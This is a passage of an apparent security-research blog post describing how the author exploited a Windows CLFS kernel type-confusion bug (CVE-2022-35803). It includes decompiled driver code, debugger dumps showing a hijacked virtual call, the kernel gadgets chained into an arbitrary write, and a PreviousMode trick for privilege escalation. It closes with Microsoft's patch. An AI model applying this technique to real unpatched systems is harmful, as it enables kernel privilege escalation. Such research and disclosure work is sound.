<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">CLFSHASHSYM</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    CLFS_NODE_ID cidNode;</span><br><span class="line">    ULONG ulHash;</span><br><span class="line">    ULONG cbHash;</span><br><span class="line">    ULONGLONG ulBelow;</span><br><span class="line">    ULONGLONG ulAbove;</span><br><span class="line">    LONG cbSymName;</span><br><span class="line">    LONG cbOffset;</span><br><span class="line">    BOOLEAN fDeleted;</span><br><span class="line">&#125; CLFSHASHSYM, *PCLFSHASHSYM;</span><br></pre></td></tr></table></figure>

<p>I need to set the cbOffset field to a value equal to the ClientContextOffset[7], and the cbSymName field to a value equal to the <code>ClientContextOffset + 0x88</code> [8] (the string where the client name is stored).</p>
<p>At this point, I initially construct the fake client context, and try to open the fake CLFS log file. I successfully bypass the patch in ValidateRgOffsets, and call the DeleteLogFile to expect the result. Unfortunately, the pContainer wasn’t modified successfully. I set a breakpoint in FlushMetadata. Then I found that the lsnLast field of client context overlaps with the fields CLFSHASHSYM.cbSymName and CLFSHASHSYM.cbOffset above the container. Therefore, when the initialized <code>(ClfsLogFcbPhyObj + 0x1E8)</code> field is modified, the CLFSHASHSYM is also modified:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">ClfsClientContext_1-&gt;lsnLast.ullOffset = *(ClfsLogFcbPhyObj + <span class="number">0x1E8</span>);</span><br></pre></td></tr></table></figure>

<p>This will make the container context fails the check of GetSymbol. I start to analyze how <code>*(ClfsLogFcbPhyObj + 0x1E8)</code> is modified:</p>
<p>The type of lsnLast is CLS_LSN, which is defined as:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">typedef struct _CLS_LSN &#123;</span><br><span class="line">  ULONGLONG Internal;</span><br><span class="line">&#125; CLS_LSN, *PCLS_LSN, PPCLS_LSN;</span><br><span class="line"></span><br><span class="line">Internal</span><br><span class="line"></span><br><span class="line">A 64-bit value that holds three pieces of information about a log record: container identifier, block offset, and record sequence number.</span><br><span class="line"></span><br><span class="line">Remarks</span><br><span class="line">A container is a contiguous physical disk extent that serves as part of a CLFS log. A given CLFS log has several containers. Each container has several sector-aligned blocks, each of which holds a numbered sequence of records. A record can be identified by the triple (logical container identifier, block offset, record sequence number).</span><br><span class="line"></span><br><span class="line">To obtain the container identifier, block offset, and record sequence number from a CLFS_LSN structure, call ClfsLsnContainer, ClfsLsnBlockOffset, and ClfsLsnRecordSequence.</span><br></pre></td></tr></table></figure>

<p>In order to find out how CLFS_LSN was modified, I set a hardware breakpoint at the address of <code>*(ClfsLogFcbPhyObj + 0x1E8)</code> after CClfsLogFcbPhysical::Initialize initializes ClfsLogFcbPhyObj, the breakpoint is triggered in CLFS!CClfsLogFcbPhysical::UpdateCachedOwnerPage. Through reversing, I found that the value of CLFS_LSN is calculated when CClfsLogFcbPhysical::AddLsnOffset is called for the first time in UpdateCachedOwnerPage:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">union _CLS_LSN __fastcall CClfsLogFcbPhysical::AddLsnOffset(CClfsLogFcbPhysical *this,const union _CLS_LSN *a2,_DWORD *lsnOwnerPage_low32,unsigned int a4)</span><br><span class="line">&#123;</span><br><span class="line">  num_0x1000 = a4;</span><br><span class="line">  if ( !lsnOwnerPage_low32</span><br><span class="line">    || (ullOffset = CLFS_LSN_INVALID.ullOffset, CLFS_LSN_INVALID.ullOffset != *(_QWORD *)lsnOwnerPage_low32) )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( !CClfsLogFcbPhysical::ValidateContainerSize((__int64)this) )</span><br><span class="line">      goto LABEL_14;</span><br><span class="line">    v9 = 0xFFFFFFFFi64;</span><br><span class="line">    if ( lsnOwnerPage_low32 )</span><br><span class="line">      v9 = *lsnOwnerPage_low32 &amp; 0xFFFFFE00;</span><br><span class="line">    lsnOwnerPage_high32 = 0xFFFFFFFFi64;</span><br><span class="line">    if ( lsnOwnerPage_low32 )</span><br><span class="line">      lsnOwnerPage_high32 = (unsigned int)lsnOwnerPage_low32[1];</span><br><span class="line">    ContainerSize = *((_QWORD *)this + 83);</span><br><span class="line">    v13 = num_0x1000 + ContainerSize * lsnOwnerPage_high32 + v9;</span><br><span class="line">    ullOffset_low32 = v13 % ContainerSize;</span><br><span class="line">    ullOffset_high32 = v13 / ContainerSize;</span><br><span class="line">    if ( HIDWORD(ullOffset_high32) || HIDWORD(ullOffset_low32) )</span><br><span class="line">    &#123;</span><br><span class="line">LABEL_14:</span><br><span class="line">      ullOffset = CLFS_LSN_INVALID.ullOffset;</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">      ullOffset = CLFS_LSN_INVALID.ullOffset;</span><br><span class="line">      if ( (_DWORD)ullOffset_high32 != -1 &amp;&amp; (ullOffset_low32 &amp; 0x1FF) == 0 )</span><br><span class="line">        ullOffset = __PAIR64__(ullOffset_high32, ullOffset_low32);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  a2-&gt;ullOffset = ullOffset;</span><br><span class="line">  return (union _CLS_LSN)a2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>To sum up, when the low 32 bits of lsnOwnerPage are not equal to CLFS_LSN_INVALID.ullOffset, the new ullOffset value is calculated from the lsnOwnerPage field of client context:</p>
<ul>
<li>The low 32 bits of the ullOffset  =  <code>(ContainerSize * lsnOwnerPage_high32 + (lsnOwnerPage_low32 &amp; 0xFFFFFE00) +0x1000) % ContainerSize</code></li>
<li>The high 32 bits of the ullOffset  =   <code>(ContainerSize * lsnOwnerPage_high32 + (lsnOwnerPage_low32 &amp; 0xFFFFFE00) +0x1000) / ContainerSize</code></li>
</ul>
<p>To protect CLFSHASHSYM from being corrupted, we need to:</p>
<ul>
<li>Set the low 32 bits of the ullOffset  ==  ContainerContextOffset + 0x30</li>
<li>Set the high 32 bits of ullOffset  ==  ContainerContextOffset.</li>
</ul>
<p>An additional consideration is that since the low 32 bits of the ullOffset will perform 0x200 bytes alignment, this requires the original cbSymName, which is <code>ContainerContextOffset + 0x30</code>, to be aligned with 0x200 bytes. Here we can choose to create multiple clients/containers to construct a satisfying offset, or directly make a container to satisfy this condition.</p>
<p>After modifying the data, trigger FlushMetadata again, and the pContainer field has been modified successfully:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rax=00000000000000f8 rbx=ffffb58d7569d000 rcx=00000000000000f8</span><br><span class="line">rdx=fffffe0c7c08b340 rsi=ffffb58d74667c01 rdi=0000000000000000</span><br><span class="line">rip=fffff80630321603 rsp=fffffe0c7c08b2f0 rbp=0000000000000000</span><br><span class="line"> r8=0000000000000810  r9=ffffa3812db7d7e0 r10=0000000000000000</span><br><span class="line">r11=ffffa3812db7c000 r12=0000000000000000 r13=0000000000000000</span><br><span class="line">r14=ffffb58d7569d0b8 r15=ffffb58d7211b8f0</span><br><span class="line">iopl=0         nv up ei pl nz na pe nc</span><br><span class="line">cs=0010  ss=0018  ds=002b  es=002b  fs=0053  gs=002b             efl=00040202</span><br><span class="line">CLFS!CClfsLogFcbPhysical::FlushMetadata+0xd3:</span><br><span class="line">fffff806`30321603 41884978        mov     byte ptr [r9+78h],cl ds:002b:ffffa381`2db7d858=f0</span><br></pre></td></tr></table></figure>

<p>Then the program runs to CClfsBaseFilePersisted::RemoveContainer, which calls the vtable function of Container object:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall CClfsBaseFilePersisted::RemoveContainer(CClfsBaseFilePersisted *this, unsigned int a2)</span><br><span class="line">&#123;					</span><br><span class="line">  ...</span><br><span class="line">          pContainer = *(_QWORD *)(ContainerContext + 0x18);</span><br><span class="line">          if ( pContainer )</span><br><span class="line">          &#123;</span><br><span class="line">            *(_QWORD *)(ContainerContext + 0x18) = 0i64;</span><br><span class="line">            ExReleaseResourceForThreadLite(*((PERESOURCE *)this + 4), (ERESOURCE_THREAD)KeGetCurrentThread());</span><br><span class="line">            v4 = 0;</span><br><span class="line">            (*(void (__fastcall **)(__int64))(*(_QWORD *)pContainer + 0x18i64))(pContainer);</span><br><span class="line">            (*(void (__fastcall **)(__int64))(*(_QWORD *)pContainer + 8i64))(pContainer);</span><br><span class="line">            v9 = v16;</span><br><span class="line">            goto LABEL_20;</span><br><span class="line">          &#125;</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>The assembly code used to call virtual table functions is:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov     rax, [rdi]     &lt;&lt;-------- 9</span><br><span class="line">mov     rax, [rax+18h] </span><br><span class="line">mov     rcx, rdi</span><br><span class="line">call    cs:__guard_dispatch_icall_fptr</span><br><span class="line">mov     rax, [rdi]</span><br><span class="line">mov     rax, [rax+8]</span><br><span class="line">mov     rcx, rdi</span><br><span class="line">call    cs:__guard_dispatch_icall_fptr</span><br></pre></td></tr></table></figure>

<p>The rax register will point to the wrong virtual function table after the [9] code is executed, and this field actually stores the file size of the Container.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CLFS!CClfsBaseFilePersisted::RemoveContainer+0x142:</span><br><span class="line">fffff806`30346ef2 488b07          mov     rax,qword ptr [rdi] ds:002b:ffffa381`2f0dd9f8=0000000000100000</span><br></pre></td></tr></table></figure>

<p>When the virtual function is called, the first parameter(stored in the register rcx) is <code>the Container object + 8</code>, which limits the function we used to achieve EoP:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1: kd&gt; r</span><br><span class="line">rax=4141414141414141 rbx=0000000000000000 rcx=ffffa3812f0dd9f8</span><br><span class="line">rdx=0000000000000000 rsi=ffffb58d7569f000 rdi=ffffa3812f0dd9f8</span><br><span class="line">rip=fffff80630346efc rsp=fffffe0c7c08b5e0 rbp=00000000000003fe</span><br><span class="line"> r8=fffffe0c7c08b5b0  r9=0000000000000000 r10=0000000000000000</span><br><span class="line">r11=fffffe0c7c08b570 r12=0000000000000002 r13=0000000000000001</span><br><span class="line">r14=0000000000001700 r15=ffffa3812db7d840</span><br><span class="line">iopl=0         nv up ei pl zr na po nc</span><br><span class="line">cs=0010  ss=0018  ds=002b  es=002b  fs=0053  gs=002b             efl=00040246</span><br><span class="line">CLFS!CClfsBaseFilePersisted::RemoveContainer+0x14c:</span><br><span class="line">fffff806`30346efc ff15ced6ffff    call    qword ptr [CLFS!_guard_dispatch_icall_fptr (fffff806`303445d0)]</span><br></pre></td></tr></table></figure>

<p>I start looking for a magic gadget in the driver space, it’s just like a CTF Challenge!<br>Through that, I found an interesting piece of code in CLFS!CClfsLogFcbPhysical::GetContainerForLsn:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall CClfsLogFcbPhysical::GetContainerForLsn(CClfsLogFcbPhysical *this,struct CClfsContainer **a2,unsigned int *a3,const union _CLS_LSN *a4)</span><br><span class="line">&#123;</span><br><span class="line">  v5 = -1;</span><br><span class="line">  if ( *a2 )</span><br><span class="line">  &#123;</span><br><span class="line">    cidContainer = -1;</span><br><span class="line">    if ( a4 )</span><br><span class="line">      cidContainer = a4-&gt;offset.cidContainer;</span><br><span class="line">    if ( *a3 == cidContainer )</span><br><span class="line">      return 0i64;</span><br><span class="line">    (*(void (__fastcall **)(struct CClfsContainer *))(*(_QWORD *)*a2 + 8i64))(*a2); &lt;&lt;-------- 10</span><br><span class="line">    *a2 = 0i64;</span><br><span class="line">  &#125;</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>This function gets a function pointer and its first parameter from the dereference of the second parameter, then calls it[10].<br>So if I can assign rcx to rdx before calling this function, I can complete a function call with a controllable parameter.</p>
<p>To assign rcx to rdx, I found a gadget in nt!FsRtlPrivateResetLowestLockOffset:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">FsRtlPrivateResetLowestLockOffset+28                   mov     rdx, rcx</span><br><span class="line">FsRtlPrivateResetLowestLockOffset+2B</span><br><span class="line">FsRtlPrivateResetLowestLockOffset+2B   loc_1402FB2FB:                          ; CODE XREF: FsRtlPrivateResetLowestLockOffset+55↓j</span><br><span class="line">FsRtlPrivateResetLowestLockOffset+2B                                           ; FsRtlPrivateResetLowestLockOffset+61↓j</span><br><span class="line">FsRtlPrivateResetLowestLockOffset+2B                   mov     rax, [rdx]</span><br><span class="line">FsRtlPrivateResetLowestLockOffset+2E</span><br><span class="line">FsRtlPrivateResetLowestLockOffset+2E   loc_1402FB2FE:                          ; CODE XREF: FsRtlPrivateResetLowestLockOffset+69↓j</span><br><span class="line">FsRtlPrivateResetLowestLockOffset+2E                   mov     [r8], rax</span><br><span class="line">FsRtlPrivateResetLowestLockOffset+31                   retn</span><br></pre></td></tr></table></figure>

<p>This gadget requires r8 to be a writable address, and this restriction happens to be satisfied when the program trigger it. After controlling the parameter, I choose to use another magic function in GetContainerForLsn: nt!XmXchgOp, it can obtain an arbitrary address write primitive by controlling the variable saved by rcx:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">XmXchgOp      XmXchgOp        proc near               ; CODE XREF: XmEmulateStream+10E↓p</span><br><span class="line">XmXchgOp                                              ; DATA XREF: .rdata:XmOpcodeFunctionTable↑o ...</span><br><span class="line">XmXchgOp                      sub     rsp, 28h</span><br><span class="line">XmXchgOp+4                    mov     eax, [rcx+78h]</span><br><span class="line">XmXchgOp+7                    mov     rdx, [rcx+60h]</span><br><span class="line">XmXchgOp+B                    test    eax, eax</span><br><span class="line">XmXchgOp+D                    jz      short loc_1403945B7</span><br><span class="line">XmXchgOp+F                    cmp     eax, 3</span><br><span class="line">XmXchgOp+12                   jnz     short loc_1403945BE</span><br><span class="line">XmXchgOp+14                   mov     eax, [rcx+68h]</span><br><span class="line">XmXchgOp+17                   mov     [rdx], eax</span><br><span class="line">XmXchgOp+19</span><br><span class="line">XmXchgOp+19   loc_1403945A9:                          ; CODE XREF: XmXchgOp+2C↓j</span><br><span class="line">XmXchgOp+19                                           ; XmXchgOp+35↓j</span><br><span class="line">XmXchgOp+19                   mov     edx, [rcx+6Ch]</span><br><span class="line">XmXchgOp+1C                   call    XmStoreResult</span><br><span class="line">XmXchgOp+21                   add     rsp, 28h</span><br><span class="line">XmXchgOp+25                   retn</span><br></pre></td></tr></table></figure>

<p>After that, there are many ways to achieve escalation of privilege. You can set the PreviousMode of the current thread to zero by arbitrary address write primitive and use the trick analyzed previously of the in-the-wild sample to achieve escalation of privilege.</p>
<h1 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h1><p><img src="exploit.gif"></p>
<h1 id="Patch-for-CVE-2022-35803"><a href="#Patch-for-CVE-2022-35803" class="headerlink" title="Patch for CVE-2022-35803"></a>Patch for CVE-2022-35803</h1><p>Microsoft patches the vulnerability by adding a check on the cType field of context in CClfsBaseFile::GetSymbol to prevent the type confusion issue in September 2022 Patch Tuesday.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall CClfsBaseFile::GetSymbol(</span><br><span class="line">        CClfsBaseFile *this,</span><br><span class="line">        unsigned int a2,</span><br><span class="line">        char ClientContextId,</span><br><span class="line">        struct _CLFS_CLIENT_CONTEXT **a4)</span><br><span class="line">&#123;</span><br><span class="line">  ...</span><br><span class="line">  v12 = ClfsQuadAlign(0x88u);</span><br><span class="line">  if ( *(_DWORD *)(ClientContextAddr - 16) != (unsigned __int64)(ClientContextOffset_1 + v12)</span><br><span class="line">    || *(_DWORD *)ClientContextAddr != 0xC1FDF007</span><br><span class="line">    || *(_DWORD *)(ClientContextAddr + 4) != v12</span><br><span class="line">    || *(_BYTE *)(ClientContextAddr + 8) != ClientContextId )</span><br><span class="line">  &#123;</span><br><span class="line">LABEL_12:</span><br><span class="line">    v8 = 0xC01A000D;</span><br><span class="line">    goto LABEL_13;</span><br><span class="line">  &#125;</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></section>
    <!-- Tags START -->
    
    <!-- Tags END -->
    <!-- NAV START -->
    
  <div class="nav-container">
    <!-- reverse left and right to put prev and next in a more logic postition -->
    
      <a class="nav-left" href="/2022/07/05/NorthSea/">
        <span class="nav-arrow">← </span>
        
          NorthSea
        
      </a>
    
    
  </div>

    <!-- NAV END -->
    
      <!-- Utterances START -->
      <div id="utterances"></div>
      <script src="https://utteranc.es/client.js"
        repo=""
        issue-term="pathname"
        theme="github-light"
        crossorigin="anonymous"
        async></script>    
      <!-- Utterances END -->
    
  </article>
  <!-- Article END -->
  <!-- Catalog START -->
  
  <!-- Catalog END -->
</main>

<script>
  (function () {
    var url = 'http://example.com/2022/11/11/Windows-Kernel-Exploit-CVE-2022-35803-in-Common-Log-File-System/';
    var banner = ''
    if (banner !== '' && banner !== 'undefined' && banner !== 'null') {
      $('#article-banner').css({
        'background-color': '#242424'
      })
    } else {
      $('#article-banner').css({
        'background-color': '#242424'
      })
    }
    $('.header').removeClass('fixed-header')

    // error image
    $(".markdown-content img").on('error', function() {
      $(this).attr('src', '/css/images/error_icon.png')
      $(this).css({
        'cursor': 'default'
      })
    })

    // zoom image
    $(".markdown-content img").on('click', function() {
      var src = $(this).attr('src')
      if (src !== '/css/images/error_icon.png') {
        var imageW = $(this).width()
        var imageH = $(this).height()

        var zoom = ($(window).width() * 0.95 / imageW).toFixed(2)
        zoom = zoom < 1 ? 1 : zoom
        zoom = zoom > 2 ? 2 : zoom
        var transY = (($(window).height() - imageH) / 2).toFixed(2)

        $('body').append('<div class="image-view-wrap"><div class="image-view-inner"><img src="'+ src +'" /></div></div>')
        $('.image-view-wrap').addClass('wrap-active')
        $('.image-view-wrap img').css({
          'width': `${imageW}`,
          'transform': `translate3d(0, ${transY}px, 0) scale3d(${zoom}, ${zoom}, 1)`
        })
        $('html').css('overflow', 'hidden')

        $('.image-view-wrap').on('click', function() {
          $(this).remove()
          $('html').attr('style', '')
        })
      }
    })
  })();
</script>
<script>
//document.body.style.fontFamily = 'Times New Roman';
</script>






    <div class="scroll-top">
  <span class="arrow-icon"></span>
</div>
    <footer class="app-footer">
  <p class="copyright">
    &copy; 2022 | NorthSea
    <br>
    
  </p>
</footer>

<script>
  function async(u, c) {
    var d = document, t = 'script',
      o = d.createElement(t),
      s = d.getElementsByTagName(t)[0];
    o.src = u;
    if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
    s.parentNode.insertBefore(o, s);
  }
</script>
<script>
  async("//cdnjs.cloudflare.com/ajax/libs/fastclick/1.0.6/fastclick.min.js", function(){
    FastClick.attach(document.body);
  })
</script>

<script>
  var hasLine = 'false';
  async("//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js", function(){
    $('figure pre').each(function(i, block) {
      var figure = $(this).parents('figure');
      if (hasLine === 'false') {
        figure.find('.gutter').hide();
      }
      hljs.configure({useBR: true});
      var lang = figure.attr('class').split(' ')[1] || 'code';
      var codeHtml = $(this).html();
      var codeTag = document.createElement('code');
      codeTag.className = lang;
      codeTag.innerHTML = codeHtml;
      $(this).attr('class', '').empty().html(codeTag);
      figure.attr('data-lang', lang.toUpperCase());
      hljs.highlightBlock(block);
    });
  })
</script>
<!-- Baidu Tongji -->


<script src="/js/script.js"></script>


  </body>
</html>